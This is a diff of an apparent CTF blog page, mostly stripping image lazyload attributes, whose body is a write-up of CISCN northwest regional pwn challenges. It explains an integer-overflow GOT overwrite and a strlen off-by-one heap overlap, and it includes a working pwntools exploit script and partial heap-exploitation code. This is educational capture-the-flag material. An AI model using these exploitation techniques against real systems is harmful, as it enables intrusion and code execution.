@@ -204,7 +204,7 @@
   </transition>
   <div class="drawer-box" :class="{'active': visible}">
     <div class="drawer-box-head bg-color">
-      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <img class="drawer-box-head_logo" src="/medias/logo.png" alt="logo">
       <h3 class="drawer-box-head_title">ABf1ag&#39;s blog</h3>
       <h5 class="drawer-box-head_desc">CTF to learn,not learn to CTF</h5>
     </div>
@@ -342,7 +342,7 @@
     <div class="blog-title" id="author-avatar">
       
         <div class="avatar">
-          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+          <img src="/medias/logo.png" alt="logo">
         </div>
       
       <a href="/" class="logo">ABf1ag&#39;s blog</a>
@@ -602,12 +602,12 @@
         <p><strong>ciscn 西北分区赛部分pwn</strong></p>
 <span id="more"></span>
 
-<h2 id="xb-pwn-easy"><a href="#xb-pwn-easy" class="headerlink" title="xb_pwn_easy"></a>xb_pwn_easy</h2><p>分析发现是道整数溢出的题，unsigned int8最大数为255，当输入的数字超出255时就会发生溢出。但当时做题我将v4输为0，也可以造成溢出，原因是read的第三个参数v4-1=-1，又read的第三个参数类型是size_t，当输入负值时，会将其转换为无符号数。<br><img src="https://img-blog.csdnimg.cn/20210607182238148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210607182238148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>利用整数溢出漏洞，可以覆盖age、email、phone，可以将email覆盖为函数的got地址，这样就可以获得函数的地址并且得到libc的基地址。<br><img src="https://img-blog.csdnimg.cn/20210607184540857.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210607184540857.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p>
-<p>修改puts函数的got表。一开始我将phone覆盖为puts_got的值，再利用edit函数将其改写为system函数的地址+‘||/bin/sh\x00’，但是报错，原因应该是system函数地址有两个‘\x00’，截断了‘||/bin/sh\x00’。改为onegadget即能打通。<br><img src="https://img-blog.csdnimg.cn/20210607190259112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210607190259112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"><br>exp：</p>
+<h2 id="xb-pwn-easy"><a href="#xb-pwn-easy" class="headerlink" title="xb_pwn_easy"></a>xb_pwn_easy</h2><p>分析发现是道整数溢出的题，unsigned int8最大数为255，当输入的数字超出255时就会发生溢出。但当时做题我将v4输为0，也可以造成溢出，原因是read的第三个参数v4-1=-1，又read的第三个参数类型是size_t，当输入负值时，会将其转换为无符号数。<br><img src="https://img-blog.csdnimg.cn/20210607182238148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用整数溢出漏洞，可以覆盖age、email、phone，可以将email覆盖为函数的got地址，这样就可以获得函数的地址并且得到libc的基地址。<br><img src="https://img-blog.csdnimg.cn/20210607184540857.png" alt="在这里插入图片描述"></p>
+<p>修改puts函数的got表。一开始我将phone覆盖为puts_got的值，再利用edit函数将其改写为system函数的地址+‘||/bin/sh\x00’，但是报错，原因应该是system函数地址有两个‘\x00’，截断了‘||/bin/sh\x00’。改为onegadget即能打通。<br><img src="https://img-blog.csdnimg.cn/20210607190259112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>exp：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io = process(&#x27;./pwn&#x27;)</span><br><span class="line">io = remote(&#x27;172.1.28.5&#x27;,8888)</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context(log_level = &#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">io.sendlineafter(&#x27;name&gt; &#x27;,&#x27;aaaa&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;email&gt; &#x27;,&#x27;bbbb&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;phone&gt; &#x27;,&#x27;cccc&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;age&gt; &#x27;,&#x27;18&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size&gt; &#x27;,&#x27;0&#x27;)</span><br><span class="line">payload = &#x27;a&#x27;*0x28+p64(read_got)+p64(0)+p64(puts_got)+p64(0x20)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">#sleep(1)</span><br><span class="line">io.recvuntil(&#x27;temail&gt; &#x27;,timeout=1)</span><br><span class="line">#sleep(1)</span><br><span class="line">read = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libcbase = read - libc.symbols[&#x27;read&#x27;]</span><br><span class="line">print(hex(libcbase))</span><br><span class="line">system = libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">onegadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;phone? &gt;&#x27;,&#x27;y&#x27;)</span><br><span class="line">#sleep(1)</span><br><span class="line">raw_input()</span><br><span class="line">io.sendlineafter(&#x27;&gt; &#x27;,p64(onegadget[3]+libcbase))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="xb-pwn-enc-system"><a href="#xb-pwn-enc-system" class="headerlink" title="xb_pwn_enc_system"></a>xb_pwn_enc_system</h2><p>保护全开，分析出漏洞在strlen函数那，strlen遇到’\x00’停止，当我们将chunk填满时，下一个chunk的size处就会被strlen算入，然后被异或造成一个字节的off-by-one漏洞。<br><img src="https://img-blog.csdnimg.cn/2021060719251554.png" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/2021060719251554.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p>
-<p>先申请3个大小为0x110的chunk，第一个chunk的密钥处填为0xb0，因为0x21^0xb0=0x91，在释放掉被更改了size域的chunk即可造成堆块堆叠。<br>gift函数可以申请1~512大小的chunk，但只能申请一次，利用此函数可以申请刚刚释放掉的被更改了size域的chunk。这时我们就可以控制tcache的0x110部分的freechunk。我们通过填充一定量的垃圾数据来泄露heap_base。<br><img src="https://img-blog.csdnimg.cn/20210607211626246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" class="lazyload placeholder" data-srcset="https://img-blog.csdnimg.cn/20210607211626246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="在这里插入图片描述"></p>
+<h2 id="xb-pwn-enc-system"><a href="#xb-pwn-enc-system" class="headerlink" title="xb_pwn_enc_system"></a>xb_pwn_enc_system</h2><p>保护全开，分析出漏洞在strlen函数那，strlen遇到’\x00’停止，当我们将chunk填满时，下一个chunk的size处就会被strlen算入，然后被异或造成一个字节的off-by-one漏洞。<br><img src="https://img-blog.csdnimg.cn/2021060719251554.png" alt="在这里插入图片描述"></p>
+<p>先申请3个大小为0x110的chunk，第一个chunk的密钥处填为0xb0，因为0x21^0xb0=0x91，在释放掉被更改了size域的chunk即可造成堆块堆叠。<br>gift函数可以申请1~512大小的chunk，但只能申请一次，利用此函数可以申请刚刚释放掉的被更改了size域的chunk。这时我们就可以控制tcache的0x110部分的freechunk。我们通过填充一定量的垃圾数据来泄露heap_base。<br><img src="https://img-blog.csdnimg.cn/20210607211626246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21pc2hpeGlhb2RhaQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">add(0,0x108,0xb0)  </span><br><span class="line">   add(1,0x108,0)</span><br><span class="line">   add(2,0x108,1)</span><br><span class="line">   payload = &#x27;a&#x27;*0x108</span><br><span class="line">   encry(0,payload)</span><br><span class="line">   payload = &#x27;a&#x27;*0x68+&#x27;\xa1&#x27;+&#x27;\x00&#x27;</span><br><span class="line">   encry(1,payload)</span><br><span class="line">   #pause()</span><br><span class="line">   dele(0)</span><br><span class="line">   dele(2)</span><br><span class="line">   dele(1)</span><br><span class="line">   gift(1,0x88,0)</span><br><span class="line">   #pause()</span><br><span class="line">   payload = &#x27;a&#x27;*0x28</span><br><span class="line">   encry(1,payload)</span><br><span class="line">   io.recvuntil(&#x27;61&#x27;*0x28)</span><br><span class="line">   heap_base = io.recv(12)</span><br><span class="line">   news=&#x27;&#x27;</span><br><span class="line">   while(len(heap_base)):</span><br><span class="line">       news += heap_base[-2:]</span><br><span class="line">       heap_base = heap_base[:-2]</span><br><span class="line">   heap_base = int(news,16)</span><br><span class="line">   print(hex(heap_base))</span><br></pre></td></tr></table></figure>
 
 <p>接着我们将freechunk的fd指针与(heap_base&gt;&gt;12)异或即可使fd指向heap_base。再连续两次申请0x110的chunk即可控制tcache。将0x110对应的chunk的counts设置为7，然后释放掉一个chunk，填充一定垃圾数据泄露main_arena的地址，得到libc的基地址。</p>
@@ -649,7 +649,7 @@
   <div class="post-nav-prev post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/9.jpg" class="lazyload placeholder" data-srcset="/medias/9.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+      <img class="lazyload" src="/medias/9.jpg" alt="">
     </div>
     <a href="/2021/06/11/house-of-atum/" class="post-nav-link">
       <div class="title">
@@ -672,7 +672,7 @@
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="/medias/3.jpg" class="lazyload placeholder" data-srcset="/medias/3.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload" src="/medias/3.jpg" src="" alt="">
     </div>
     <a href="/2021/06/11/ciscn2021-xi-bei-bu-fen-pwn/" class="post-nav-link">
       <div class="title">
@@ -729,10 +729,10 @@ pwny读取随机数到bss段上作为文件描述符
       </div>
       <div class="donate-box_img">
         <div class="AlipayImg" v-show="tabActive === 'Alipay'">
-          <img src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
+          <img src="/medias/1.jpg" alt="支付宝打赏" />
         </div> 
         <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
-          <img src="/medias/2.jpg" class="lazyload placeholder" data-srcset="/medias/2.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
+          <img src="/medias/2.jpg" alt="微信打赏" />
         </div>
       </div>
     </div>
@@ -943,7 +943,7 @@ pwny读取随机数到bss段上作为文件描述符
             <div class="post-img-box">
               <a href="/2099/06/11/ri-zhi/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -964,7 +964,7 @@ pwny读取随机数到bss段上作为文件描述符
             <div class="post-img-box">
               <a href="/2023/01/18/kernel-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" class="lazyload placeholder" data-srcset="/medias/7.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/7.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -985,7 +985,7 @@ pwny读取随机数到bss段上作为文件描述符
             <div class="post-img-box">
               <a href="/2023/01/06/llvmpass-chu-tan/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" class="lazyload placeholder" data-srcset="/medias/1.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/1.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1006,7 +1006,7 @@ pwny读取随机数到bss段上作为文件描述符
             <div class="post-img-box">
               <a href="/2022/12/30/nian-zhong-zong-jie-2022/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" class="lazyload placeholder" data-srcset="/medias/15.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/15.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
@@ -1027,7 +1027,7 @@ pwny读取随机数到bss段上作为文件描述符
             <div class="post-img-box">
               <a href="/2022/01/19/yi-gou-pwn-xue-xi-ji-lu/" class="post-img " style="background-size: cover; 
                 background-position: center center;">
-                <img class="lazyload lazyload placeholder" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" class="lazyload placeholder" data-srcset="/medias/11.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
+                <img class="lazyload" style="width:100%;height:100%;object-fit:cover;" data-src="/medias/11.jpg" alt="">
               </a>
             </div>
             <div class="post-date-title">
